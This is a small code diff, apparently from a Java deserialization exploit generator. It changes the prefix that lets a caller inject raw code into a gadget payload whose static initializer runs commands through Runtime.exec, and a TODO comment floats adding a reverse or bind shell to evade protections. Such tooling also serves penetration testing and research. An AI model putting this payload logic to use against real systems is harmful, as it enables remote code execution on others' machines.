@@ -118,8 +118,8 @@ public class Gadgets {
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
         String cmd;
-        if(command.startsWith("RCEECHO;")){
-            cmd = command.substring(8);
+        if(command.startsWith("CODE;")){
+            cmd = command.substring(5);
         }else{
             cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                 command.replace("\\", "\\\\").replace("\"", "\\\"") +
